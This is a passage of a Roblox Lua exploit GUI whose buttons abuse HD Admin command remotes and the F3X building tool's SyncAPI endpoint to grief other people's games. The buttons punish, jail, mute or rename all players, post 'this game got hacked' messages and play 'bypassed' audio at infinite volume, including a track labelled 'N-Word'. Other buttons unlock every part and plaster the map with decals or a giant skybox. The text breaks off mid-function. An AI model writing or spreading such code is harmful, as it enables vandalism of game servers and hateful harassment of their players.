f3x.Position = UDim2.new(0.772, 0,0.489, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Day"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 27
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";time 12")
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.056, 0,0.524, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Hint"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 27
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";h Z00ndkidd is here. Enjoy the map")
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.195, 0,0.523, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Hint 2"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 27
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";h this game got hacked by Z00ndkidd")
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.337, 0,0.521, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Message"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 27
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";m Z00ndkidd is back.")
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.48, 0,0.529, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Message 2"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 21
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";m Team Z00ndkidd Join Today!")
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.619, 0,0.531, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Decal 4"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 27
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local player = game.Players.LocalPlayer
	local char = player.Character or player.CharacterAdded:Wait()
	local tool

	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end

	if not tool then
		warn("Tool com SyncAPI não encontrado.")
		return
	end

	local remote = tool.SyncAPI.ServerEndpoint

	local function _(args)
		remote:InvokeServer(unpack(args))
	end



	function SpawnDecal(part,side)
		local args = {
			[1] = "CreateTextures",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal"
				}
			}
		}
		_(args)
	end

	function AddDecal(part,asset,side)
		local args = {
			[1] = "SyncTexture",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal",
					["Texture"] = "rbxassetid://".. asset
				}
			}
		}
		_(args)
	end

	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end

	function spam(id)
		for i,v in workspace:GetDescendants() do
			if v:IsA("BasePart") then
				spawn(function()
					SetLocked(v,false)
					SpawnDecal(v,Enum.NormalId.Front)
					AddDecal(v,id,Enum.NormalId.Front)

					SpawnDecal(v,Enum.NormalId.Back)
					AddDecal(v,id,Enum.NormalId.Back)

					SpawnDecal(v,Enum.NormalId.Right)
					AddDecal(v,id,Enum.NormalId.Right)

					SpawnDecal(v,Enum.NormalId.Left)
					AddDecal(v,id,Enum.NormalId.Left)

					SpawnDecal(v,Enum.NormalId.Bottom)
					AddDecal(v,id,Enum.NormalId.Bottom)

					SpawnDecal(v,Enum.NormalId.Top)
					AddDecal(v,id,Enum.NormalId.Top)
				end)
			end
		end 
	end


	spam("92706344395644") 
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.762, 0,0.524, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Skybox 4"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 27
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()


	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end
	function Color(part,color)
		local args = {
			[1] = "SyncColor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Color"] = color,
					["UnionColoring"] = false
				}
			}
		}
		_(args)
	end
	function SpawnDecal(part,side)
		local args = {
			[1] = "CreateTextures",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal"
				}
			}
		}
		_(args)
	end
	function AddDecal(part,asset,side)
		local args = {
			[1] = "SyncTexture",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal",
					["Texture"] = "rbxassetid://".. asset
				}
			}
		}
		_(args)
	end

	function Sky(id)
		e = char.HumanoidRootPart.CFrame.x
		f = char.HumanoidRootPart.CFrame.y
		g = char.HumanoidRootPart.CFrame.z
		CreatePart(CFrame.new(math.floor(e),math.floor(f),math.floor(g)) + Vector3.new(0,6,0),workspace)
		for i,v in game.Workspace:GetDescendants() do
			if v:IsA("BasePart") and v.CFrame.x == math.floor(e) and v.CFrame.z == math.floor(g) then
				SetName(v,"Skybox")
				AddMesh(v)
				SetMesh(v,"111891702759441")
				SetTexture(v,id)
				MeshResize(v,Vector3.new(7200, 7200, 7200))
				SetLocked(v,true)
			end
		end
	end
	Sky("92706344395644")


end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.06, 0,0.567, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Delete Players"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 15
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";Punish all")
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.209, 0,0.567, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Jail Others"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 15
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";Jail Others")
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.357, 0,0.567, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Mute Others"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 15
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";Mute Others")
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.501, 0,0.569, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Blur Others"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 15
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";Blur Others")
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.642, 0,0.57, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Bring All"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 15
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";Bring All")
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.056, 0,0.599, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Black2spooky Decal"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 11
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local player = game.Players.LocalPlayer
	local char = player.Character or player.CharacterAdded:Wait()
	local tool

	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end

	if not tool then
		warn("Tool com SyncAPI não encontrado.")
		return
	end

	local remote = tool.SyncAPI.ServerEndpoint

	local function _(args)
		remote:InvokeServer(unpack(args))
	end



	function SpawnDecal(part,side)
		local args = {
			[1] = "CreateTextures",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal"
				}
			}
		}
		_(args)
	end

	function AddDecal(part,asset,side)
		local args = {
			[1] = "SyncTexture",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal",
					["Texture"] = "rbxassetid://".. asset
				}
			}
		}
		_(args)
	end

	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end

	function spam(id)
		for i,v in workspace:GetDescendants() do
			if v:IsA("BasePart") then
				spawn(function()
					SetLocked(v,false)
					SpawnDecal(v,Enum.NormalId.Front)
					AddDecal(v,id,Enum.NormalId.Front)

					SpawnDecal(v,Enum.NormalId.Back)
					AddDecal(v,id,Enum.NormalId.Back)

					SpawnDecal(v,Enum.NormalId.Right)
					AddDecal(v,id,Enum.NormalId.Right)

					SpawnDecal(v,Enum.NormalId.Left)
					AddDecal(v,id,Enum.NormalId.Left)

					SpawnDecal(v,Enum.NormalId.Bottom)
					AddDecal(v,id,Enum.NormalId.Bottom)

					SpawnDecal(v,Enum.NormalId.Top)
					AddDecal(v,id,Enum.NormalId.Top)
				end)
			end
		end 
	end


	spam("81354756431989") 
end)


local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.78, 0,0.57, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Black2spooky Skybox"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 11
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()


	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end
	function Color(part,color)
		local args = {
			[1] = "SyncColor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Color"] = color,
					["UnionColoring"] = false
				}
			}
		}
		_(args)
	end
	function SpawnDecal(part,side)
		local args = {
			[1] = "CreateTextures",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal"
				}
			}
		}
		_(args)
	end
	function AddDecal(part,asset,side)
		local args = {
			[1] = "SyncTexture",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal",
					["Texture"] = "rbxassetid://".. asset
				}
			}
		}
		_(args)
	end

	function Sky(id)
		e = char.HumanoidRootPart.CFrame.x
		f = char.HumanoidRootPart.CFrame.y
		g = char.HumanoidRootPart.CFrame.z
		CreatePart(CFrame.new(math.floor(e),math.floor(f),math.floor(g)) + Vector3.new(0,6,0),workspace)
		for i,v in game.Workspace:GetDescendants() do
			if v:IsA("BasePart") and v.CFrame.x == math.floor(e) and v.CFrame.z == math.floor(g) then
				SetName(v,"Skybox")
				AddMesh(v)
				SetMesh(v,"111891702759441")
				SetTexture(v,id)
				MeshResize(v,Vector3.new(7200, 7200, 7200))
				SetLocked(v,true)
			end
		end
	end
	Sky("81354756431989")


end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.209, 0,0.599, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Notice All"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 22
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";Notice All Z00ndkidd Is back.")
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.35, 0,0.599, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Name All Black2spooky"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 10
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";Name all BLACK2SPOOKY")
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.488, 0,0.599, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Name All Eagles2212"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 10
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";Name all EAGLES2212")
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.631, 0,0.604, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Billboard Black2spooky"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 10
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";Title all BLACK2SPOOKY")
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.772, 0,0.605, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Billboard Eagles2212"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 10
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";Title all EAGLES2212")
end)

local titleText = Instance.new("TextLabel")
titleText.Size = UDim2.new(0, 160,0, 18)
titleText.Position = UDim2.new(0.376, 0,0.646, 0)
titleText.BackgroundColor3 = Color3.new(0, 0, 0)
titleText.BorderSizePixel = 4
titleText.BorderColor3 = Color3.new(0, 0, 0)
titleText.Font = Enum.Font.Code
titleText.Text = "--Bypassed Musics/Audios--"
titleText.TextColor3 = Color3.new(1, 1, 1)
titleText.TextSize = 14
titleText.Parent = mainFrame

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.086, 0,0.675, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "N-Word"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 27
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";music 1491842303")
	RequestCommand:InvokeServer(";volume inf") 
	RequestCommand:InvokeServer(";pitch 5")
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.227, 0,0.674, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "k00pkidd Theme"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 14
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";music 1839246711")
	RequestCommand:InvokeServer(";volume inf")  
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.368, 0,0.673, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "c00lkidd Theme"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 14
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";music 77484784570543")
	RequestCommand:InvokeServer(";pitch 0.1")
	RequestCommand:InvokeServer(";volume inf")
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.511, 0,0.674, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Life In Paradise"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 14
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";music 8987498425989")
	RequestCommand:InvokeServer(";volume inf")  
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.488, 0,0.299, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Russian Skybox"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 14
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()


	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
